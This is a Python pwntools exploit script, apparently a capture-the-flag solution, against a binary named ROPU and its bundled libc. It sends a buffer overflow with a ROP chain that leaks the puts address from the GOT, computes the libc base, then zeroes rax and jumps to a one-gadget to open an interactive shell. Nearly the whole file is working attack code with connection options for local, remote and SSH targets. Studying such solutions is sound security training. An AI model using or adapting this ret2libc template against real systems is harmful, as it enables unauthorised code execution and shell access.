import argparse
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

# cmdline argument - how to connect to binary
parser = argparse.ArgumentParser()
parser.add_argument("--local", help="Run exploit locally", action="store_true")
parser.add_argument("--attach", help="Run exploit locally and attach debugger", action="store_true")
parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
parser.add_argument("--ssh", help="Run exploit on SSH server", action="store_true")
args = parser.parse_args()

# GDB commands
debugging = False
gdb_cmd = [
	"c"
]

# Binary names
bin_fname = './ROPU'
libc_fname = './libc-2.23.so'

# Remote
IP = ''
PORT = 0

# SSH
URL = ''
username = ''
password = ''
bin_abs_path = ''

# Create ELF objects
e = ELF(bin_fname)
libc = ELF(libc_fname) if libc_fname else None
x64 = e.bits != 32

# Command line args
# e.g. arg1 = cyclic_find('ahaa') * 'a' + '\xbd\x86\x04\x08' + 'a' * 4 + p32(next(e.search('/bin/sh')))
arg1 = ''
proc_args = [bin_fname, arg1]

if args.remote:
	p = remote(IP, PORT)
elif args.local or args.attach:
	p = process(proc_args)
	if args.attach:
		gdb.attach(p, gdbscript="\n".join(gdb_cmd))
elif args.ssh:
	s = ssh(host=URL, user=username, password=password)
	s.set_working_directory(bin_abs_path)
	p = s.process(proc_args)
else:
	p = gdb.debug(proc_args, gdbscript="\n".join(gdb_cmd))
	debugging = True

"""
	Exploit

	Examples:
	func_offset = libc.symbols['puts'] 	# Offset in libc
	puts_addr = p32(e.got['puts'])
	main = e.symbols['main']
	addr_string = next(e.search('/bin/cat flag.txt'))
"""

# Use the below to find the offset of the saved instruction pointer
# p.sendline(cyclic(100, n=8 if x64 else 4))
# p.interactive()

# Begin actual exploit
pop_rdi = 0x0000000000400783 # pop rdi ; ret
shell = 0x45216 # Condition: rax = NULL
pop_rax = 0x0000000000033544

# Receive "Remote debugging". Only do this if using GDB
if debugging:
	print(p.recvline())

# Receive "Enter your Payload!"
print(p.recvline())

# Send payload one to leak address
buf = cyclic_find('faaaaaaa', n=8) * 'a' # 40 bytes
buf += p64(pop_rdi)
buf += p64(e.got['puts'])
buf += p64(e.plt['puts'])
buf += p64(e.symbols['main'])
p.sendline(buf)

# Receive the echoed payload (until the first null byte, since printf stops there)
print(p.recvn(buf.index('\x00')))

# Receive the GOT address of puts
leaked_puts = u64(p.recv(6).ljust(8, '\x00'))
log.info(hex(leaked_puts))

# Compute libc base
libc_base = leaked_puts - libc.symbols['puts']

# Receive "Enter your Payload!"
print(p.recvline())

# Send payload two to clear $rax and go to shell
buf = cyclic_find('faaaaaaa', n=8) * 'a' # 40 bytes
buf += p64(pop_rax + libc_base)
buf += p64(0)
buf += p64(shell + libc_base)
buf += p64(libc.symbols['exit'] + libc_base)
p.sendline(buf)

p.interactive()
